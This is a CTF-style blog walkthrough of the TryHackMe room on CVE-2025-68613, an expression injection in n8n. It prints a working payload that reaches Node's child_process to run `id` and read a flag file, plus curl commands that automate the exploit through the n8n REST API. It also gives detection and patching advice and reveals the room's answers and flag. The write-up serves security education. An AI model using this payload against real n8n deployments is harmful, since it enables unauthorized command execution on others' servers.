---
title: "TryHackMe n8n CVE-2025-68613: Expression Injection to RCE"
date: 2026-09-11T10:33:00+05:30
lastmod: 2026-09-11T10:33:00+05:30
author: Animesh Roy
avatar: /img/avatar.jpeg
authorlink: https://anir0y.in
featureimage: img/thm-n8n/00-thumbnail.png

categories:
  - TryHackMe

tags:
  - tryhackme
  - thm
  - rooms
  - Jr Penetration Tester
  - Vulnerability Knowledge
  - n8n
  - CVE-2025-68613
  - RCE
  - Expression Injection
  - Node.js
  - child_process
  - Workflow Automation

draft: false
description: "Walkthrough of the TryHackMe n8n CVE-2025-68613 room: an authenticated expression injection in n8n workflow evaluation escalates to RCE through child_process."
---

The n8n room sits in the **Vulnerability Knowledge** module of the Jr Penetration Tester path, alongside [Basic Vulnerability Identification Techniques](/post/thm-room-basicvulnerabilityidentificationtechniques/) and the scanning-tool rooms. Where those rooms teach you to spot and triage weaknesses, this one takes a single published CVE and walks it end to end: read the advisory, understand the code path, then drive the exploit against a live target. The vulnerability is CVE-2025-68613, a critical remote code execution flaw in n8n rated CVSS 9.9.

This is an easy, browser-driven room with two real answers and a flag. I solved it against the lab target, captured the exploit in the n8n interface, and also scripted the same primitive against the n8n REST API so the whole chain is reproducible.

## Task 1: Introduction

n8n is an open-source workflow automation platform. You build workflows out of nodes, where each node is an action such as an HTTP request, a data transform, or an email send. Two n8n features matter for this CVE:

- **The expression evaluation system** processes dynamic expressions wrapped in double curly braces, `{{ }}`, and evaluates them as JavaScript during workflow execution.
- **Code nodes** let users write custom JavaScript or Python as a workflow step.

Versions 0.211.0 through 1.120.3 evaluate user-supplied workflow expressions in an insecure context. An authenticated attacker can break out of the intended expression sandbox and run system commands with the privileges of the n8n process. The lab target runs **1.121.0**, which is inside the vulnerable range. The fix landed in 1.120.4, 1.121.1, and 1.122.0.

The first task only needs you to move on, so submit and continue.

## Task 2: Technical Background

n8n is built on Node.js. The expression evaluator is meant to run user expressions in a restricted scope, but the CVE shows that the scope still exposes a path to Node's internals. The exploit encapsulates the escape inside an anonymous function:

```javascript
  // the expression n8n evaluates, unwrapped for readability
  function () {
      return this.process.mainModule.require('child_process').execSync('id').toString()
  }
```

Walking the chain one hop at a time explains why it works:

- `this` resolves to the global object in the Node.js execution context.
- `process` is the Node global that exposes the running process.
- `process.mainModule` is the root module of the application.
- `require('child_process')` pulls in the module that spawns processes.
- `execSync('id')` runs a shell command, and `.toString()` turns the returned Buffer into readable text.

So the context escalation goes: expression sandbox, then the Node global scope via `this`, then the module system via `process.mainModule.require`, and finally system command execution. User expressions should never be able to reach the module system, and reaching a module as dangerous as this one is the whole bug.

The question asks for the module that allowed system command execution. The answer is **child_process**.

## Task 3: Exploitation

The target runs n8n on port 5678. On the AttackBox you would open Firefox to `http://MACHINE_IP:5678`; connected over the VPN you can reach it from your own browser. The room hands you working credentials:

- Email: `tryhackme@thm.local`
- Password: `Try12345!`

![n8n sign-in page on the lab target](/img/thm-n8n/01-signin.png)

Once logged in, start a new workflow. It needs two nodes: a **Manual Trigger** and an **Edit Fields (Set)** node connected after it. In the Set node, click **Add Field**, name it `result`, switch the value to an expression, and paste the payload the room provides:

```javascript
  {{ (function(){ return this.process.mainModule.require('child_process').execSync('id').toString() })() }}
```

![n8n workflow with a Manual Trigger feeding the Edit Fields node](/img/thm-n8n/02-workflow-canvas.png)

Click **Execute step** (or **Execute workflow**). The expression evaluates during execution, the injected function runs `id` on the host, and the command output comes back in the node's output panel.

![The Set node expression on the left and the id command output on the right](/img/thm-n8n/03-rce-id-output.png)

The output field returns `uid=1000(node) gid=1000(node) groups=1000(node)`, so the workflow process runs as the unprivileged `node` user. That is enough for the flag: swap `id` for a command that reads the flag file.

{{< ad >}}

The flag lives in the n8n user's home directory, so change the command to `cat /home/node/flag.txt` and run the node again.

![The flag read back through the same expression injection](/img/thm-n8n/04-flag-output.png)

The output panel shows the flag: **THM{n8n_exposed_workflow}**.

Everything the interface does here also runs over the n8n REST API, which is how I automated the solve. After logging in for a session cookie, create a workflow that carries the payload, run it, and read the execution result:

```bash
  # authenticate and keep the n8n-auth cookie
  curl -s -c cj.txt -X POST http://TARGET:5678/rest/login \
    -H 'Content-Type: application/json' \
    -d '{"emailOrLdapLoginId":"tryhackme@thm.local","password":"Try12345!"}'

  # create the workflow (Manual Trigger + Set node with the expression),
  # then run it by id and pull the execution output
  curl -s -b cj.txt -X POST http://TARGET:5678/rest/workflows/<id>/run \
    -H 'Content-Type: application/json' --data @run.json
  # execution output: uid=1000(node) gid=1000(node) groups=1000(node)
```

Same expression, same result, no clicking required. It is a clean reminder that an authenticated web UI usually has an API behind it that accepts the same malicious input.

## Task 4: Detection

Because exploitation happens through an authenticated user building a normal-looking workflow, network signatures alone will miss it. The room's guidance is to make sure your security stack watches the application and the host, not just the perimeter. Practical detections for this class of bug:

- Alert on n8n processes spawning shells or `child_process` children such as `sh`, `id`, `whoami`, or `cat`, since a workflow engine has no reason to fork a shell.
- Watch for expression or Code-node content that references `process`, `mainModule`, `require`, or `child_process`.
- Keep n8n patched to 1.120.4, 1.121.1, 1.122.0 or later, and restrict who can author workflows.

This task needs no answer, so mark it complete.

## Task 5: Conclusion

The last task just points you at related content. Submit to close the room at 100 percent.

![Room completed at 100 percent with all five tasks solved](/img/thm-n8n/05-room-complete.png)

## Takeaways

Two things worth carrying out of this room:

- **An expression language that evaluates as real JavaScript is a code interpreter, not a template.** Once `this` reaches the Node global object, `process.mainModule.require('child_process')` is a straight line to command execution. Sandboxing has to remove the path to the module system, not just filter keywords.
- **The UI and the API share the same trust boundary.** The room teaches the browser workflow, but the identical payload runs through `/rest/workflows/<id>/run`. When you test or defend an app like this, remember the authenticated attacker can skip the interface entirely and post the malicious workflow directly.

Room solved 100%: 5 tasks, 2 answers.
